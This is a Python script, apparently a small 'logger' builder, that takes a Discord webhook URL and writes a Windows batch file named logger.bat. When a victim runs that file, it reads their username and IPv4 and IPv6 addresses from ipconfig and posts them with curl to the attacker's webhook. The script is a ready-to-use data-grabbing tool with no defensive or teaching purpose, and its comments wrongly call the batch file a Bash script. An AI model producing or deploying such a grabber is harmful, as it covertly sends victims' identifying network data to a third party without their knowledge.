import os

os.system('color d')

# Python script to generate a Bash script with a Discord webhook URL

print("""
=======================================================================
$$\   $$\ $$\       $$\                 $$\                          
$$ | $$  |\__|      $$ |                $$ |                         
$$ |$$  / $$\  $$$$$$$ |$$$$$$$$\       $$ |      $$$$$$\   $$$$$$\  
$$$$$  /  $$ |$$  __$$ |\____$$  |      $$ |     $$  __$$\ $$  __$$\ 
$$  $$<   $$ |$$ /  $$ |  $$$$ _/       $$ |     $$ /  $$ |$$ /  $$ |
$$ |\$$\  $$ |$$ |  $$ | $$  _/         $$ |     $$ |  $$ |$$ |  $$ |
$$ | \$$\ $$ |\$$$$$$$ |$$$$$$$$\       $$$$$$$$\\$$$$$$  |\$$$$$$$ |
\__|  \__|\__| \_______|\________|      \________|\______/  \____$$ |
                                                           $$\   $$ |
                                                           \$$$$$$  |
                                                            \______/ 
      
Created By CoConut_Man
=======================================================================
""")

# Ask the user for the Discord webhook URL
webhook_url = input("Enter your Discord webhook URL: ")

# Bash script template with placeholder for the webhook URL
bash_script = f"""@echo off
setlocal enabledelayedexpansion

REM Initialize variables
set "IPV4_ADDRESS="
set "IPV6_ADDRESS="

REM Get the IPv4 address
for /f "tokens=14 delims= " %%i in ('ipconfig ^| findstr /R "IPv4 Address"') do (
    set "IPV4_ADDRESS=%%i"
)

REM Get the full IPv6 address
for /f "tokens=2,* delims=:" %%i in ('ipconfig ^| findstr /R "IPv6 Address"') do (
    set "IPV6_ADDRESS=%%i:%%j"
    REM Trim leading spaces
    set "IPV6_ADDRESS=!IPV6_ADDRESS:~1!"
    goto :found_ipv6
)

:found_ipv6
REM Get the current username
set "USER_NAME=%USERNAME%"

REM Format the message
set "MESSAGE=User: %USER_NAME% IPv4: %IPV4_ADDRESS% IPv6: %IPV6_ADDRESS%"

REM Print the IPv4 and IPv6 addresses
echo %MESSAGE%

REM Set your webhook URL here
set "WEBHOOK_URL={webhook_url}"

REM Use curl to send the message
curl --ssl-no-revoke -H "Content-Type: application/json" -X POST -d "{{\\"content\\":\\"%MESSAGE%\\"}}" %WEBHOOK_URL%

endlocal
"""

# Save the Bash script to a file
with open("logger.bat", "w") as file:
    file.write(bash_script)

print("Bash script 'logger.bat' has been created successfully.")
